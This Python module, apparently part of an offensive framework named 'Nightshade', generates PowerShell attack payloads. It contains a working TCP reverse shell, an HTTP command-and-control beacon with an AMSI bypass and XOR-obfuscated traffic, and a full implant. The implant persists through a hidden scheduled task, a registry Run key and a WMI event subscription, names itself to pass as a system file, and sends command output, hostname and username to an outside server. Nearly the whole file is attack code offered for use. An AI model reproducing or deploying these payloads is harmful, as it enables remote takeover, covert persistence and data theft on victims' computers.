"""
Nightshade PowerShell Payload Generator.
Produces reverse shell, RCE beacon, and full C2 implant payloads
with evasion preamble, jitter, and encrypted C2 protocol.
"""
import json
from string import Template
from ..core.crypto import NightshadeCrypto
from ..core.evasion import EvasionGenerator


class PowerShellPayloadFactory:
    """Generate tiered PowerShell payloads."""

    def __init__(self, crypto: NightshadeCrypto, c2_url: str, session_id: str):
        self._crypto = crypto
        self._c2_url = c2_url.rstrip("/")
        self._session_id = session_id
        self._evasion = EvasionGenerator()

    # ------------------------------------------------------------------ #
    #  Tier 1: Revershell (raw TCP)                                       #
    # ------------------------------------------------------------------ #
    def reverse_shell(self, target_host: str, target_port: int = 4444) -> str:
        if "ngrok" in target_host or "ngrok-free" in target_host:
            parts = target_host.rsplit(":", 1)
            host = parts[0]
            port = int(parts[1]) if len(parts) > 1 else target_port
        else:
            host = target_host
            port = target_port

        return f"""
{self._evasion.full_evasion_block()}

# Nightshade Reverse Shell — Tier 1
$h='{host}';$p={port}
$c=New-Object System.Net.Sockets.TCPClient($h,$p)
$s=$c.GetStream()
[byte[]]$b=0..65535|%{{0}}
$s.Write([Text.Encoding]::ASCII.GetBytes('NIGHTSHADE_CONNECTED`n'),0,23)
while(($i=$s.Read($b,0,$b.Length))-ne0){{
    $d=([Text.Encoding]::ASCII).GetString($b,0,$i)
    $send=(iex $d 2>&1|Out-String)
    $s2=$send+'PS> '
    $s.Write([Text.Encoding]::ASCII.GetBytes($s2),0,$s2.Length)
    $s.Flush()
}}
$c.Close()
""".strip()

    # ------------------------------------------------------------------ #
    #  Tier 2: RCE + Persistence (HTTP C2 beacon)                         #
    # ------------------------------------------------------------------ #
    def rce_beacon(self) -> str:
        task_endpoint = f"{self._c2_url}/c2/checkin"
        result_endpoint = f"{self._c2_url}/c2/result"

        return f"""
{self._evasion.full_evasion_block()}
$sid='{self._session_id}'
$cu='{self._c2_url}'
$ci=0
$ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

function Enc-Data($d){{
    $k=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{self._crypto._passphrase}'))
    # Simple XOR + b64 for low-detect transport (layer 1)
    $b=[Text.Encoding]::UTF8.GetBytes($d)
    $key=[Convert]::FromBase64String($k)
    for($i=0;$i-lt$b.Length;$i++){{$b[$i]=$b[$i]-bxor$key[$i%$key.Length]}}
    return [Convert]::ToBase64String($b)
}}
function Dec-Data($d){{
    try{{
        $b=[Convert]::FromBase64String($d)
        $key=[Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{self._crypto._passphrase}')))
        for($i=0;$i-lt$b.Length;$i++){{$b[$i]=$b[$i]-bxor$key[$i%$key.Length]}}
        return [Text.Encoding]::UTF8.GetString($b)
    }}catch{{return 'noop'}}
}}

# Persistence
$pp="$env:APPDATA\\Microsoft\\Windows\\Caches\\cache.ps1"
if(-not(Test-Path(Split-Path $pp))){{New-Item -ItemType Dir -Path (Split-Path $pp)-Force|Out-Null}}
@'
{self._evasion.random_amsi_bypass()}
$sid='{self._session_id}';$cu='{self._c2_url}'
# reconnected
'@|Out-File $pp -Force

# Scheduled task
$ta=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Win 1 -Exec Bypass -File `"$pp`""
$tr=New-ScheduledTaskTrigger -AtLogOn
$tp=New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\\$env:USERNAME" -LogonType Interactive
$ts=New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "WindowsCacheSvc" -Action $ta -Trigger $tr -Principal $tp -Settings $ts -Force|Out-Null

# Beacon loop
while($true){{
    $ci++
    try{{
        $b=Enc-Data("checkin_$ci")
        $r=Invoke-WebRequest "$cu/c2/checkin" -Method POST -Body $b -Headers @{{"User-Agent"=$ua;"X-Session-ID"=$sid}} -UseBasicParsing
        $cmd=Dec-Data $r.Content
        if($cmd-ne'noop' -and $cmd.type-eq'task'){{
            $res=(iex $cmd.command 2>&1|Out-String)
            $enc=Enc-Data('{{"type":"result","task_id":"'+$cmd.task_id+'","status":"success","result":"'+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($res))+'","hostname":"'+$env:COMPUTERNAME+'","username":"'+$env:USERNAME+'","timestamp":"'+(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')+'","session_id":"'+$sid+'","checkin_count":'+$ci+'}}')
            Invoke-WebRequest "$cu/c2/result" -Method POST -Body $enc -Headers @{{"User-Agent"=$ua;"X-Session-ID"=$sid}} -UseBasicParsing|Out-Null
        }}
    }}catch{{}}
    $j=Get-Random -Min 45 -Max 120;Start-Sleep -Seconds $j
}}
""".strip()

    # ------------------------------------------------------------------ #
    #  Tier 3: Full C2 Agent (advanced)                                   #
    # ------------------------------------------------------------------ #
    def full_agent(self) -> str:
        return f"""
{self._evasion.full_evasion_block()}

# Nightshade C2 Agent — Tier 3
$sid='{self._session_id}'
$cu='{self._c2_url}'
$ci=0
$ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
$pp="$env:APPDATA\\Microsoft\\Windows\\Caches\\svchost.ps1"
$rp="$env:APPDATA\\Microsoft\\Windows\\Caches"

# Ensure dir exists
if(-not(Test-Path $rp)){{New-Item -ItemType Dir -Path $rp -Force|Out-Null}}

# Write self
$s=@'
{self._evasion.random_amsi_bypass()}
$sid='{self._session_id}';$cu='{self._c2_url}'
'@
$s|Out-File $pp -Force

# Persistence layer 1: scheduled task
try{{
    $ta=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Win 1 -Exec Bypass -File `"$pp`""
    $tr=New-ScheduledTaskTrigger -AtLogOn
    $tp=New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\\$env:USERNAME" -LogonType Interactive
    $ts=New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName "WindowsFontCache" -Action $ta -Trigger $tr -Principal $tp -Settings $ts -Force|Out-Null
}}catch{{}}

# Persistence layer 2: registry RUN
try{{
    New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsFontCache" -Value "powershell.exe -Win 1 -Exec Bypass -File `"$pp`"" -PropertyType String -Force|Out-Null
}}catch{{}}

# Persistence layer 3: WMI (if available)
try{{
    $f=[wmiclass]'\\\\.\\root\\subscription:__EventFilter'
    $c=[wmiclass]'\\\\.\\root\\subscription:CommandLineEventConsumer'
    $bf=[wmiclass]'\\\\.\\root\\subscription:__FilterToConsumerBinding'
    $filter=$f.CreateInstance()
    $filter.QueryLanguage='WQL'
    $filter.Query="SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"
    $filter.Name='FontCacheFilter'
    $filter.Put()|Out-Null
    $consumer=$c.CreateInstance()
    $consumer.Name='FontCacheConsumer'
    $consumer.CommandLineTemplate="powershell.exe -Win 1 -Exec Bypass -File `"$pp`""
    $consumer.Put()|Out-Null
    $binding=$bf.CreateInstance()
    $binding.Filter=$filter.Path
    $binding.Consumer=$consumer.Path
    $binding.Put()|Out-Null
}}catch{{}}

# Beacon loop with variable jitter
while($true){{
    $ci++
    $j=$ci%8-eq0?90:45
    try{{
        $b=("{0}_{1}" -f "checkin",$ci)
        $r=Invoke-WebRequest "$cu/c2/checkin" -Method POST -Body $b -Headers @{{"User-Agent"=$ua;"X-Session-ID"=$sid}} -UseBasicParsing
        try{{
            $cmd=$r.Content
            if($cmd-ne'noop'){{
                $res=(iex $cmd 2>&1|Out-String)
                $resB64=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($res))
                $enc="$ci|$resB64|$env:COMPUTERNAME|$env:USERNAME"
                Invoke-WebRequest "$cu/c2/result" -Method POST -Body $enc -Headers @{{"User-Agent"=$ua;"X-Session-ID"=$sid}} -UseBasicParsing|Out-Null
            }}
        }}catch{{}}
    }}catch{{}}
    Start-Sleep -Seconds $j
}}
""".strip()

    # ------------------------------------------------------------------ #
    #  Factory dispatch                                                    #
    # ------------------------------------------------------------------ #
    def generate(self, tier: int = 2, target_host: str = "127.0.0.1", target_port: int = 4444) -> str:
        if tier == 1:
            return self.reverse_shell(target_host, target_port)
        elif tier == 2:
            return self.rce_beacon()
        elif tier == 3:
            return self.full_agent()
        raise ValueError(f"Unknown tier: {tier}")
